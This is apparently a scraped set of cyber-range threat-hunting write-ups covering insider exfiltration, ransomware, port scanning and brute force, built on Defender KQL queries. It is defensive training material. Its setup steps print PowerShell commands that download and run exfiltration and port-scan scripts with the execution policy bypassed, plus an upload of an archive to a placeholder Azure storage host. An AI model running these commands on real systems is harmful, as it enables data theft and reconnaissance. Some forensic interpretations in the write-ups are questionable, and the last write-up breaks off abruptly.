The scenario revolved around a disgruntled employee placed on a Performance Improvement Plan (PIP) who was suspected of archiving and leaking proprietary company data.\r\n\r\nThe purpose of this hunt was to determine whether the employee's device showed evidence of unauthorized data compression, archiving, or transmission activity. Using Microsoft Defender for Endpoint (MDE), I leveraged multiple telemetry tables and KQL-based threat-hunting techniques to uncover any trace of insider-driven data-exfiltration behavior.\r\n\r\nMy lab environment consisted of an onboarded Windows VM named samson-windows-, which reported telemetry to MDE in real time. This allowed me to simulate realistic user behavior, analyze relevant forensic artifacts, and document a structured end-to-end threat-hunting process.\r\n\r\n## Scenario Overview\r\n\r\nThe investigation began when management raised a concern about John Doe, an employee in a sensitive department who had recently been placed on a PIP after a workplace altercation. Following the incident, leadership feared that John might attempt to steal sensitive data and resign.\r\n\r\nJohn's workstation, samson-windows-, was configured with administrative privileges and unrestricted PowerShell access, an ideal setup for potential insider misuse. The working hypothesis was that John might have compressed critical data using utilities such as 7-Zip or WinRAR, then attempted to transfer those archives outside the corporate network.\r\n\r\nThe objective of this threat hunt was to analyze logs, identify any evidence of archiving behavior, and determine whether exfiltration attempts occurred.\r\n\r\n## Preparation\r\n\r\nBefore the analysis, I ensured that the VM (samson-windows-) was successfully onboarded to MDE. Once active, I simulated malicious insider behavior by executing a PowerShell script that automated the compression and simulated upload of internal files. This helped generate realistic telemetry for review.\r\n\r\n- Created VM and onboarded to Microsoft Defender for Endpoint\r\n- RDP connection established to VM\r\n- Downloaded and ran MDE onboarding package\r\n- VM successfully reporting in Defender portal\r\n\r\n### PowerShell Command\r\n\r\n-------------------------------------------------------\r\npowershell\r\nInvoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1' -OutFile 'C:\\programdata\\exfiltratedata.ps1'; cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\\programdata\\exfiltratedata.ps1\r\n-------------------------------------------------------\r\n\r\nThis command downloaded and executed the ExfiltrateData.ps1 script, which silently installed 7-Zip, created compressed archives of sample \"employee data,\" and simulated uploading them to an external Azure storage bucket.\r\n\r\nIn an enterprise context, this type of activity would strongly suggest unauthorized data handling or insider exfiltration. Allowing the VM to run for several minutes ensured that sufficient telemetry was collected across all relevant MDE tables for subsequent analysis.\r\n\r\n## Data Collection\r\n\r\nWith the environment set up, I verified that Defender for Endpoint was actively ingesting telemetry into the core tables:\r\n\r\n- DeviceFileEvents\r\n- DeviceProcessEvents\r\n- DeviceNetworkEvents\r\n\r\nI ran an initial query to confirm that new records were appearing in real time.\r\n\r\n### KQL Check for Recent Logs\r\n\r\n-------------------------------------------------------\r\nkql\r\nDeviceFileEvents\r\n| order by Timestamp desc\r\n| take 10\r\n-------------------------------------------------------\r\n\r\nThe query confirmed that logs were fresh and consistent, ensuring that the upcoming threat-hunting queries would analyze live data. In a production SOC, this mirrors the critical validation step before any deep-dive investigation: confirming log integrity and timeliness.\r\n\r\n## Data Analysis\r\n\r\nThe next step was to search for file archiving activities, which could indicate data being staged for exfiltration. To achieve this, I filtered DeviceProcessEvents for any processes linked to known archiving applications such as 7-Zip, WinRAR, or Bandizip.\r\n\r\n### KQL – Detect Archive Process Activity\r\n\r\n-------------------------------------------------------\r\nkql\r\nlet archive_applications = dynamic([\"winrar.exe\",\"7z.exe\",\"winzip32.exe\",\"peazip.exe\",\"Bandizip.exe\",\"UniExtract.exe\",\"POWERARC.EXE\",\"IZArc.exe\",\"AshampooZIP.exe\",\"FreeArc.exe\"]);\r\nlet VMName = \"samson-windows-\";\r\nDeviceProcessEvents\r\n| where FileName has_any(archive_applications)\r\n| order by Timestamp desc\r\n-------------------------------------------------------\r\n\r\nWithin seconds, several 7-Zip executions were observed on samson-windows-, followed by the creation of a suspicious archive named employee_data.zip. The events revealed a sequence of file creations and renames inside C:\\ProgramData\\Backup\\, suggesting automation.\r\n\r\nEach entry was timestamped at predictable intervals, reinforcing the possibility of a scripted operation.\r\n\r\n## Investigation\r\n\r\nTo understand the sequence of events more deeply, I pivoted to the DeviceProcessEvents table to identify which process spawned 7-Zip and to the DeviceFileEvents table to trace archive creation activity.\r\n\r\n### KQL – Correlate File and Process Activity\r\n\r\n-------------------------------------------------------\r\nkql\r\nlet VMName = \"samson-windows-\";\r\nlet specificTime = datetime(2025-10-14T18:42:10.5615171Z);\r\nDeviceProcessEvents\r\n| where Timestamp between ((specificTime - 2m) .. (specificTime + 2m))\r\n| where DeviceName == VMName\r\n| order by Timestamp desc\r\n| project Timestamp, FileName, InitiatingProcessCommandLine\r\n-------------------------------------------------------\r\n\r\nThis query identified a PowerShell script named exfiltrate_data.ps1 executed under the System account, which silently installed 7-Zip and then created the archive. The log also showed a follow-up PowerShell command initiating a network connection immediately after compression, a strong indicator of data exfiltration.\r\n\r\nUpon reviewing the VM's filesystem, I located the script at C:\\ProgramData\\exfiltratedata.ps1. Its content confirmed automated behavior: downloading, archiving, and attempting to upload files to an external endpoint.\r\n\r\n\u003cInlineGallery images={data-exfiltration-detection-analysis} title=\"Data Exfiltration Detection and Analysis Process\" /\u003e\r\n\r\n### Snippet of the Observed PowerShell Script\r\n\r\nSimplified excerpt of ExfiltrateData.ps1\r\n\r\n-------------------------------------------------------\r\npowershell\r\nStart-Process \"7z.exe\" -ArgumentList \"a\", \"C:\\ProgramData\\Backup\\employee_data.zip\", \"C:\\SensitiveFiles*\"\r\nInvoke-WebRequest -Uri \"https://storageaccount.blob.core.windows.net/container/employee_data.zip\" -Method Put -InFile \"C:\\ProgramData\\Backup\\employee_data.zip\"\r\n-------------------------------------------------------\r\n\r\nThe script structure and timing aligned perfectly with the MDE logs, validating that a scripted 7-Zip operation had occurred. While no explicit network event confirmed the upload due to logging limitations, the sequence strongly suggested an attempted data transfer.\r\n\r\n## Response and MITRE ATT\u0026CK Mapping\r\n\r\nThis activity mapped directly to several tactics within the MITRE ATT\u0026CK Framework:\r\n\r\n1. **T1059.001 – PowerShell (Execution)**: PowerShell was used to install and execute the archiving utility.\r\n2. **T1560 – Archive Collected Data (Collection)**: 7-Zip was used to compress sensitive data.\r\n3. **T1074 – Data Staged (Collection)**: Archives were staged locally in C:\\ProgramData\\Backup\\.\r\n4. **T1048 – Exfiltration Over Alternative Protocol (Exfiltration)**: The script attempted HTTP PUT operations to Azure Blob storage.\r\n5. **T1082 – System Information Discovery (Discovery)**: System metadata was queried before execution.\r\n\r\nUpon discovering the activity, I isolated samson-windows- using Defender for Endpoint's \"Isolate Device\" feature to prevent further data loss. A subsequent malware scan returned no persistent threats; however, standard protocol would dictate re-imaging the endpoint for assurance.\r\n\r\n## Documentation\r\n\r\nEvery step of this hunt should meticulously be documented from initial hypothesis through evidence gathering and correlation. All queries, findings, timestamps, and reasoning should be logged to ensure transparency and repeatability.\r\n\r\nThis approach mirrors a real-world SOC investigation, where maintaining a chronological record of queries and findings is crucial for post-incident reviews and audits. It also supports organizational learning by building an internal knowledge repository for future hunts.\r\n\r\n## Improvement\r\n\r\nFollowing the investigation, several security improvements were identified for the environment:\r\n\r\n1. **Restrict PowerShell Execution Policies**: Limit execution to signed scripts only.\r\n2. **Apply Data Loss Prevention (DLP) Controls**: Block unauthorized archive creation and outbound uploads.\r\n3. **Enable Network Segmentation**: Prevent free east-west traffic between workstations.\r\n4. **Implement Insider Threat Monitoring**: Establish alerts for mass file compressions or rapid archiving.\r\n5. **Automate Detection Rules**: Create custom Defender queries to alert when users modify more than N ZIP files within a defined interval.\r\n\r\nTogether, these recommendations would help detect and contain future insider threat attempts before data is lost.\r\n\r\n## Conclusion\r\n\r\nThis scenario successfully demonstrated how a disgruntled employee with admin rights could use simple PowerShell automation and compression tools to exfiltrate data without triggering traditional antivirus alerts.\r\n\r\nThrough structured querying in Microsoft Defender for Endpoint and methodical log analysis, I was able to trace the entire activity chain, from script execution to archiving and simulated upload attempts.\r\n\r\nThis exercise reinforced the importance of monitoring for non-malware abuse of legitimate tools and the necessity of tight endpoint controls to detect and deter insider threats in modern enterprise networks.\r\n\r\n## Important Link\r\n\r\nIf you are interested in joining the [CYBER-RANGE COMMUNITY](https://www.skool.com/cyber-range/about?ref=b6e2c83b43e243d2b690aa6ea6c383b5) or following along with the labs, you can check it out here: [LINK](https://www.skool.com/cyber-range/about?ref=b6e2c83b43e243d2b690aa6ea6c383b5)\r\n"])</script><script>self.__next_f.push([1,"14:T2e31,"])</script><script>self.__next_f.push([1,"\r\n## Introduction\r\n\r\nThis investigation was conducted to examine suspicious file activity observed within the virtual machine samson-windows-, which was onboarded to Microsoft Defender for Endpoint (MDE). The objective was to determine whether abnormal file modification behaviour and ransom instructions on the desktop were the result of ransomware execution, and if so, to identify its origin, propagation chain, and indicators of compromise.\r\n\r\nUsing Microsoft Defender's advanced hunting capabilities, telemetry from multiple tables — DeviceFileEvents and DeviceProcessEvents — was analyzed to reconstruct the attack sequence.\r\n\r\n## Scenario Overview\r\n\r\nA new ransomware strain, internally referred to as PwnCrypt, had been reported as circulating in the wild. It leverages a PowerShell-based payload that encrypts local files using AES-256 encryption, appending the custom extension .pwncrypt. The strain also leaves ransom instructions in a desktop file demanding Bitcoin payment for decryption.\r\n\r\nDuring lab testing, the same behaviour appeared on samson-windows-: three files on the Desktop were encrypted, and a text file appeared reading:\r\n\r\n\"Your files have been encrypted. To get a decryption key, send this amount of Bitcoin to…\"\r\n\r\nThe task was to confirm the root cause of this encryption, identify the executing process chain, and determine whether any persistence or lateral movement mechanisms were present.\r\n\r\n## Preparation\r\n\r\nPrior to the hunt, the samson-windows- VM was successfully onboarded to MDE, ensuring telemetry ingestion from endpoint sensors. A PowerShell script named pwncrypt.ps1 was executed in the background to simulate a real ransomware infection, but the analysis was performed as if the infection were unknown.\r\n\r\nThe first step was to establish a baseline of file activity to identify when the anomaly began.\r\n\r\n## Data Collection\r\n\r\nThe analyst verified active log collection across Defender's telemetry tables. Using DeviceFileEvents, all file operations within the last 30 minutes were grouped by timestamp to visualize spikes in file write volume:\r\n\r\n-------------------------------------------------------\r\nkql\r\nlet VMName = \"samson-windows-\";\r\nDeviceFileEvents\r\n| where DeviceName == VMName\r\n| where Timestamp \u003e= ago(30m)\r\n| summarize FileEvents = count() by bin(Timestamp, 5m)\r\n| order by Timestamp asc\r\n-------------------------------------------------------\r\n\r\nResult: Three distinct spikes appeared within a short interval, suggesting a mass file modification event, the initial indicator of ransomware behavior.\r\n\r\n## Data Analysis\r\n\r\n### A. Mass File Modification and Extension Changes\r\n\r\nTo examine which file types were most affected, the following query was run:\r\n\r\n-------------------------------------------------------\r\nkql\r\nDeviceFileEvents\r\n| where DeviceName == VMName\r\n| where ActionType in (\"FileRenamed\",\"FileCreated\",\"FileModified\")\r\n| extend ext = tostring(split(FileName,\".\")[-1])\r\n| summarize Count = count() by ext\r\n| order by Count desc\r\n-------------------------------------------------------\r\n\r\nObservation: Extensions such as .dll, .mui, .xml, and .png appeared frequently normal for background Windows processes — but hidden within the logs were sudden surges of renamed files later correlated with the encryption timestamps.\r\n\r\n### B. Folder-Level Analysis (Staging Behaviour)\r\n\r\nTo determine where encryption occurred:\r\n\r\n-------------------------------------------------------\r\nkql\r\nlet VMName = \"samson-windows-\";\r\nDeviceFileEvents\r\n| where DeviceName == VMName and Timestamp \u003e= ago(30m)\r\n| where ActionType == \"FileCreated\"\r\n| summarize count() by Folder = extract(@\"^(.*)\\\\[^\\\\]+$\",1,FileName)\r\n| order by count_ desc\r\n-------------------------------------------------------\r\n\r\nResult: High activity was isolated to a single user folder — C:\\Users\\samson\\Desktop — confirming that encryption primarily targeted the Desktop directory.\r\n\r\n### C. Identifying Script Execution\r\n\r\nThe next step was to look for evidence of any scripts or command-line interpreters responsible for the mass file actions:\r\n\r\n-------------------------------------------------------\r\nkql\r\nlet VMName = \"samson-windows-\";\r\nDeviceProcessEvents\r\n| where DeviceName == VMName and Timestamp \u003e= ago(30m)\r\n| where FileName has_any (\"powershell\",\"pwsh\",\"cmd.exe\",\"wscript.exe\",\"cscript.exe\",\"wmic.exe\")\r\n| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine\r\n| order by Timestamp desc\r\n-------------------------------------------------------\r\n\r\nResult: Two instances of PowerShell.exe were identified, both launched non-interactively with the parameters:\r\n\r\nExecutionPolicy AllSigned -NoProfile -NonInteractive -Command \"\u0026 {...}\"\r\n\r\nThe initiator process was senseir.exe, a legitimate Windows background service that had been abused to execute PowerShell. This discovery confirmed that PowerShell was used to deploy or execute the encryption payload.\r\n\r\n### D. Tracing Child Processes and Persistence Mechanisms\r\n\r\nTo verify what PowerShell spawned:\r\n\r\n-------------------------------------------------------\r\nkql\r\nDeviceProcessEvents\r\n| where DeviceName == VMName\r\n| where InitiatingProcessFileName == \"powershell.exe\"\r\n| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine\r\n| order by Timestamp desc\r\n-------------------------------------------------------\r\n\r\nResult: PowerShell launched several cmd.exe and svchost.exe instances. These, in turn, executed processes such as python.exe, GameBarElevatedFT_Alias.exe, and MediaPlayer.exe, which were all generated within C:\\Users\\samson\\AppData\\Local\\Temp — a common ransomware staging area.\r\n\r\n### E. File Events Linked to User Folders\r\n\r\nTo focus on desktop encryption evidence:\r\n\r\n-------------------------------------------------------\r\nkql\r\nlet VMName = \"samson-windows-\";\r\nDeviceFileEvents\r\n| where DeviceName == VMName\r\n| where Timestamp \u003e= ago(24h)\r\n| where ActionType in (\"FileCreated\",\"FileRenamed\",\"FileModified\")\r\n| where FolderPath has_any(\"Desktop\",\"\\\\Users\\\\\")\r\n| project Timestamp, ActionType, FileName, FolderPath, InitiatingProcessFileName\r\n| order by Timestamp desc\r\n-------------------------------------------------------\r\n\r\nResult:\r\n\r\nA file named __decryption-instructions.lnk appeared on the desktop immediately after hundreds of file renames and creations, confirming the delivery of the ransom note. The parent process was explorer.exe, which executed after system encryption had completed, a typical behaviour of ransomware scripts displaying ransom messages post-infection.\r\n\r\n### F. Process Chain Correlation – Root Cause Determination\r\n\r\nFinally, to reconstruct the infection path:\r\n\r\n-------------------------------------------------------\r\nkql\r\nlet VMName = \"samson-windows-\";\r\nDeviceProcessEvents\r\n| where DeviceName == VMName\r\n| where Timestamp between (ago(120m) .. now())\r\n| where FileName in~ (\"powershell.exe\",\"cmd.exe\",\"services.exe\",\"svchost.exe\")\r\n| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, AccountName\r\n| order by Timestamp asc\r\n-------------------------------------------------------\r\n\r\nFindings:\r\n\r\n1. powershell.exe (initiated by senseir.exe) executed a hidden script with an AllSigned policy bypass.\r\n2. This instance spawned cmd.exe, which registered background services.\r\n3. services.exe then created multiple svchost.exe processes running under SYSTEM and Network Service accounts.\r\n4. These service-hosted processes performed the encryption routines on user data.\r\n\r\n\u003cInlineGallery images={pwncrypt-ransomware-investigation} title=\"PwnCrypt Ransomware Investigation and Analysis Process\" /\u003e\r\n\r\n## Investigation Summary\r\n\r\nThe analysis confirmed that samson-windows- was infected with PwnCrypt ransomware delivered via a PowerShell payload. The encryption occurred under SYSTEM privileges, appending custom extensions to files and generating a ransom note on the desktop.\r\n\r\nExecution Chain:\r\nsenseir.exe → powershell.exe → cmd.exe → services.exe → svchost.exe → file encryption (.pwncrypt)\r\n\r\n## Response and Containment\r\n\r\n1. Isolated the compromised VM from the network using Defender's Isolate Device function.\r\n2. Conducted a full antivirus and Defender scan; confirmed malicious artifacts were limited to the VM.\r\n3. Recommended a complete VM rebuild to remove any residual persistence.\r\n4. Captured SHA-1 hashes of key malicious files (__decryption-instructions.lnk, encrypted files) for threat-intel reference.\r\n5. Logged the incident for follow-up reporting to management and for potential YARA-rule creation.\r\n\r\n## Documentation\r\n\r\nEach phase of this investigation — preparation, data collection, analysis, and response — was recorded within Microsoft Defender's query history and screenshots for audit and learning purposes.\r\n\r\nAll queries were executed methodically to trace the incident from initial file-system anomalies to the responsible process hierarchy.\r\n\r\n## MITRE ATT\u0026CK Mapping\r\n\r\nThe PwnCrypt ransomware activity observed in samson-windows- aligns with several stages of the MITRE ATT\u0026CK framework.\r\n\r\n1. **Initial Access (T1204.002 – User Execution)**: Infection began through manual execution of a malicious PowerShell script.\r\n2. **Execution (T1059.001 / T1059.003)**: PowerShell and CMD were used to run the payload and supporting commands.\r\n3. **Persistence (T1543.003)**: New service-host processes were created to maintain execution.\r\n4. **Privilege Escalation \u0026 Defense Evasion (T1569.002 / T1562.001 / T1036.005)**: Ransomware leveraged elevated service contexts, bypassed PowerShell policies, and masqueraded as legitimate Windows binaries.\r\n5. **Discovery (T1082)**: Enumerated user directories such as C:\\Users\\samson\\Desktop before encryption.\r\n6. **Impact (T1486 / T1491.001)**: Encrypted user files with the .pwncrypt extension and dropped a ransom note (__decryption-instructions.lnk).\r\n\r\nOverall, the attack followed a full ransomware kill chain — Execution → Persistence → Privilege Escalation → Defence Evasion → Impact — demonstrating how PowerShell abuse and service creation can rapidly lead to data encryption and ransom deployment.\r\n\r\n## Improvement and Lessons Learned\r\n\r\n1. **Restrict PowerShell usage**: Configure Constrained Language Mode and allow only signed scripts.\r\n2. **Implement application whitelisting**: Block unauthorized interpreters (cmd.exe, powershell.exe, etc.) in user space.\r\n3. **Monitor mass file modifications**: Create a detection rule for spikes in FileModified and FileRenamed actions per host.\r\n4. **Enhance user awareness**: Ransomware often enters through phishing or drive-by downloads; continuous education is essential.\r\n5. **Segment the network**: Prevent lateral propagation between machines by enforcing least-privilege access controls.\r\n\r\n## Conclusion\r\n\r\nThe investigation conclusively determined that the observed encryption on samson-windows- was caused by the PwnCrypt ransomware, executed via a PowerShell-based payload with SYSTEM privileges.\r\n\r\nAlthough contained within the lab environment, the event accurately simulated a real-world ransomware outbreak and demonstrated how rapid detection through telemetry correlation from file anomalies to process hierarchies enables timely containment.\r\n\r\nThrough disciplined analysis and structured response, this project reinforced the value of proactive threat-hunting practices using Microsoft Defender for Endpoint.\r\n\r\n## Important Link\r\n\r\nIf you are interested in joining the [CYBER-RANGE COMMUNITY](https://www.skool.com/cyber-range/about?ref=b6e2c83b43e243d2b690aa6ea6c383b5) or following along with the labs, you can check it out here: [LINK](https://www.skool.com/cyber-range/about?ref=b6e2c83b43e243d2b690aa6ea6c383b5)\r\n"])</script><script>self.__next_f.push([1,"15:T3430,"])</script><script>self.__next_f.push([1,"\n## Introduction\n\nThis threat hunting exercise was focused on investigating a sudden and unexplained network slowdown observed within a simulated enterprise lab environment. Using Microsoft Defender for Endpoint (MDE), the purpose of this hunt was to determine whether the performance degradation was caused by malicious internal activity, excessive resource usage, or misconfigured systems.\n\nThe environment consisted of my onboarded virtual machine named samson-windows-1, which was actively reporting telemetry to Microsoft Defender for Endpoint. The goal was to use real-time logs and threat hunting queries to identify abnormal behaviors that could suggest internal reconnaissance, port scanning, or other unauthorized actions within the network.\n\nThis scenario demonstrates a practical application of endpoint detection and response (EDR) data in uncovering internal security issues and applying structured analysis techniques to isolate potential causes.\n\n## Scenario Overview\n\nThe issue began when the server team observed an overall slowdown across multiple legacy devices in the 10.0.0.0/16 subnet. External DDoS attacks were ruled out, meaning the cause was likely internal. The unrestricted internal network environment, where all hosts could communicate freely and PowerShell was allowed without restriction, created a perfect scenario for internal misuse or exploitation.\n\nThe working hypothesis for this hunt was that one of the systems inside the local network could have been performing unauthorized port scanning or large data transfers, which would naturally create latency or bandwidth congestion. The objective was to identify the specific device responsible for this unusual activity and determine whether it was a deliberate or automated action.\n\n## Preparation\n\nBefore starting the hunt, I ensured that my virtual machine, samson-windows-, was properly onboarded to Microsoft Defender for Endpoint. Once confirmed, I simulated an internal event by executing a PowerShell command designed to initiate a controlled port scan within the local subnet. This step was necessary to generate realistic logs for analysis, mimicking what a real-world internal threat might look like.\n\n\u003cInlineGallery images={vm-setup-onboarding} title=\"VM Setup and Microsoft Defender Onboarding Process\" /\u003e\n\n### PowerShell Command\n-------------------------------------------------------\npowershell\nInvoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1' -OutFile 'C:\\programdata\\portscan.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\\programdata\\portscan.ps1\n-------------------------------------------------------\n\nThis PowerShell command downloaded and executed a script that scanned a range of IPs within the 10.0.0.x subnet, sequentially probing ports on other devices. In a real enterprise setting, this would represent a potential reconnaissance operation, something commonly done by attackers or misconfigured tools trying to map network exposure.\n\nAfter executing the command, I allowed several minutes for the resulting logs to populate in Microsoft Defender for Endpoint's hunting tables. The preparation phase was crucial, as it ensured that the system had generated enough telemetry to analyze behaviors such as failed connection attempts, sequential port scanning, and process execution traces.\n\n## Data Collection\n\nOnce the environment was prepared, the next phase involved verifying that telemetry data was actively being received across the three key Defender tables: DeviceNetworkEvents, DeviceFileEvents, and DeviceProcessEvents.\n\nI began by executing a simple query to confirm that new logs were flowing in correctly. By ordering results by timestamp and taking the most recent entries, I could confirm that MDE was actively collecting data and that there were no ingestion delays.\n\n### KQL Check for Recent Network Logs\n-------------------------------------------------------\nkql\nDeviceNetworkEvents\n| order by Timestamp desc\n| take 10\n-------------------------------------------------------\n\nThe timestamps confirmed that logs were being generated in real time. Having verified the data sources, I was confident that the environment was providing the necessary visibility to conduct meaningful analysis.\n\nIn a real security operations environment, this phase mimics ensuring that sensors and logging mechanisms are functioning correctly before an investigation begins. Without fresh telemetry, an analyst could end up drawing conclusions from outdated or incomplete information.\n\n## Data Analysis\n\nThe analysis phase began with looking for signs of network anomalies, specifically focusing on connection attempts that had either failed or succeeded in large quantities. A sudden burst of such activity could be indicative of scanning or enumeration attempts within the network.\n\n### KQL – Count Failed Connections\n-------------------------------------------------------\nkql\nDeviceNetworkEvents\n| where ActionType == \"ConnectionFailed\"\n| summarize FailedConnectionsAttempts = count() by DeviceName, ActionType, LocalIP, RemoteIP\n| order by FailedConnectionsAttempts desc\n-------------------------------------------------------\n\nWhen the results came back, the data immediately pointed to samson-windows- as the primary contributor to abnormal connection failures. The logs revealed that the device had failed over a hundred connection attempts, some directed at its own IP address and others toward another host in the subnet. Such behavior was a strong indicator of either misconfiguration or automated probing.\n\nTo further understand the scope of the activity, I drilled down into specific IP addresses that exhibited the highest failure rates. This approach mirrors a real-world scenario where analysts pivot from a general pattern to a specific anomaly for deeper inspection.\n\n### KQL – Inspect All Failed Connections from a Specific IP\n-------------------------------------------------------\nkql\nlet IPInQuestion = \"10.0.0.5\";\nDeviceNetworkEvents\n| where ActionType == \"ConnectionFailed\"\n| where LocalIP == IPInQuestion\n| order by Timestamp desc\n-------------------------------------------------------\n\nUpon reviewing the sequence of failed connection attempts, it became clear that the remote ports being contacted followed a sequential pattern: ports 21, 23, 25, 53, 80, 110, 443, and others. This pattern matched the signature of a port scanning activity, which is typically used to identify open services running across hosts. Sequential probing of well-known ports is rarely accidental and often indicates reconnaissance or mapping behavior within the network.\n\nAt this stage, I had high confidence that the slowdown was caused by internal scanning originating from the samson-windows- VM.\n\n\u003cInlineGallery images={network-investigation-analysis} title=\"Network Investigation and Analysis Process\" /\u003e\n\n## Investigation\n\nTo confirm the origin of this suspicious activity, I pivoted to the DeviceProcessEvents table to look for the process responsible for initiating these connections. By focusing on a specific time window surrounding the detected network anomalies, I aimed to identify any executable or script that matched the port scanning behavior.\n\n### KQL – Correlate Process Activity around the Port Scan Time\n-------------------------------------------------------\nkql\nlet VMName = \"samson-windows-\";\nlet specificTime = datetime(2025-10-12T13:15:03.9576325Z);\nDeviceProcessEvents\n| where Timestamp between ((specificTime - 10m) .. (specificTime + 10m))\n| where DeviceName == VMName\n| order by Timestamp desc\n| project Timestamp, FileName, InitiatingProcessCommandLine\n-------------------------------------------------------\n\nThe query output revealed that a PowerShell script named portscan.ps1 had been executed under the System account. This was a significant finding because the System account generally has administrative-level privileges and is not typically used to execute network scanning scripts.\n\nUpon logging into the VM, I located the file in C:\\ProgramData\\portscan.ps1 and reviewed its contents. The script was intentionally scanning hosts in the subnet, sequentially testing common ports. This confirmed that the slowdown was caused by repeated internal scanning initiated by the PowerShell script.\n\n### Snippet of the observed PowerShell script:\n-------------------------------------------------------\npowershell\nfor ($i=4; $i -le 10; $i++) {\n   Test-NetConnection \"10.0.0.$i\" -Port 21,23,25,53,80,110,443\n}\n-------------------------------------------------------\n\nSince the script was running under the System account and not triggered by an identifiable user, I concluded that the activity was automated and potentially malicious. I proceeded to isolate the samson-windows- VM from the network using Defender for Endpoint's built-in Isolate Device feature.\n\nAfter isolating the system, I ran a full malware scan to check for persistence mechanisms or additional payloads. The scan returned clean, but ideally you are to request a full rebuild of the VM. In a production setting, this step ensures that any potential hidden or dormant artifacts are fully removed.\n\n\u003cInlineGallery images={port-scan-investigation-isolation} title=\"Port Scan Investigation and Device Isolation Process\" /\u003e\n\n## Response and MITRE ATT\u0026CK Mapping\n\nThis scenario corresponded with several techniques in the MITRE ATT\u0026CK Framework, helping align the observed activity with recognized adversarial tactics:\n\n1. **Reconnaissance (T1046 – Network Service Scanning)**: The port scanning activity represented a clear attempt to enumerate open services.\n2. **Execution (T1059.001 – PowerShell)**: The PowerShell script was used as the execution medium for network probing.\n3. **Privilege Escalation (T1078 – Valid Accounts / System Context)**: The script ran under the System account, suggesting a high privilege level.\n4. **Lateral Movement (T1021 – Remote Services)**: The scanning pattern indicated attempts to discover reachable hosts for potential lateral movement.\n\nBy isolating the device, scanning for malware, and scheduling a reimage, the risk of any further impact was neutralized.\n\n## Documentation\n\nThroughout the course of this investigation, I documented every major step and observation to ensure a clear understanding of how the event unfolded. The investigation began with an initial hypothesis of possible internal misuse, which evolved into the discovery of systematic port scanning. Each query used in Defender for Endpoint was recorded alongside its findings to form an evidence trail.\n\nThis documentation not only captured the technical steps taken, such as verifying logs, pivoting between tables, and confirming the script execution but also reflected the reasoning behind each action. Maintaining detailed documentation like this allows for transparency, consistency, and reproducibility in future hunts. It also helps build reference material that can be used by other analysts for similar incidents, ensuring the organization's knowledge base grows with every investigation.\n\n## Improvement\n\nAfter analyzing the entire scenario, several improvement points were identified. First, it became clear that PowerShell execution policies were too relaxed in this environment. Restricting PowerShell to only run signed scripts would immediately reduce the risk of arbitrary script execution.\n\nSecond, the internal network lacked segmentation, allowing one compromised host to communicate freely with all others. In a real corporate setup, proper network segmentation would ensure that unnecessary east-west traffic is limited and monitored.\n\nThird, implementing automated alerting for abnormal internal traffic patterns, such as repeated connection failures to sequential ports, would enable the SOC team to detect similar behavior earlier. Additionally, conducting proactive threat hunts on a routine basis helps catch reconnaissance activities before they evolve into actual compromise events.\n\nUltimately, this scenario reinforced the importance of combining technical detection with procedural discipline, ensuring every hunt improves the overall security posture of the environment.\n\n## Conclusion\n\nThe sudden network slowdown was traced to a PowerShell-based port scanning script executed under the System account on samson-windows-. Although no active compromise was found, the activity realistically simulated how internal reconnaissance could degrade performance and increase exposure within an unrestricted network.\n\nThis hunt demonstrated the power of Microsoft Defender for Endpoint in identifying behavioral anomalies, correlating telemetry across different data sources, and facilitating immediate containment actions.\n\nThrough structured investigation and methodical documentation, this exercise emphasized how internal misconfigurations or unauthorized automation can lead to observable network symptoms, and how disciplined threat hunting can quickly uncover their root cause.\n\n## Important Link\n\nIf you are interested in joining the [CYBER-RANGE COMMUNITY](https://www.skool.com/cyber-range/about?ref=b6e2c83b43e243d2b690aa6ea6c383b5) or following along with the labs, you can check it out here: [LINK](https://www.skool.com/cyber-range/about?ref=b6e2c83b43e243d2b690aa6ea6c383b5)\n\n"])</script><script>self.__next_f.push([1,"16:T2201,"])</script><script>self.__next_f.push([1,"\r\n# Introduction\r\n\r\nAs part of my continuous threat hunting practice, I conducted a scenario using Microsoft Defender for Endpoint (MDE) and the Microsoft 365 Security suite.

The legitimate account nick-labuser showed 18 successful logins, all from valid IPs\r\n2. No failed logons were associated with nick-labuser\r\n3. No malicious IPs were able to gain access\r\n\r\n## MITRE ATT\u0026CK Framework Mapping\r\n\r\nThis investigation identified several relevant MITRE ATT\u0026CK techniques:\r\n\r\n1. T1190 – Exploit Public-Facing Application: The internet-facing VM represented a potential attack vector\r\n2. T1078 – Valid Accounts: Legitimate logons by nick-labuser demonstrated normal account usage\r\n3. T1110 – Brute Force: Multiple failed attempts from external IPs constituted brute-force attacks\r\n4. T1587.001 – Develop Capabilities: Exploit Code: Inference from multiple bad actors attempting access suggests organized attack attempts\r\n\r\n## Response Recommendations\r\n\r\nIf this were a real enterprise environment, the following actions should be implemented:\r\n\r\n1. Network Security: Restrict inbound access via Network Security Groups (NSGs) to only trusted IPs\r\n2. Multi-Factor Authentication: Enforce MFA on critical accounts such as nick-labuser\r\n3. Account Lockout Policy: Implement an account lockout policy to prevent unlimited login attempts\r\n4. Continuous Monitoring: Monitor failed login telemetry continuously for early detection\r\n\r\n## Improvement \u0026 Reflection\r\n\r\n### Lessons Learned\r\n\r\n1. VM Hardening: Strengthen VM hardening by default to avoid unnecessary public exposure\r\n2. Query Efficiency: Improve efficiency of hunting queries by pre-building templates for repeated use\r\n3. Investigation Workflow: Enhance investigation workflow with automated enrichment of IP reputation and geolocation\r\n\r\n### Professional Development\r\n\r\nThis threat hunting exercise demonstrates the process of validating whether an exposed VM has been compromised. Even though nick-test-vm-md was subject to persistent brute-force attempts, proper analysis confirmed no successful intrusion.\r\n\r\nRegular hunts like this not only uncover potential misconfigurations but also build proactive defense habits, mapping every finding against MITRE ATT\u0026CK to ensure structured threat coverage.\r\n\r\n## Conclusion\r\n\r\nThis scenario provided valuable hands-on experience with enterprise-grade security tools and real-world threat hunting methodologies.

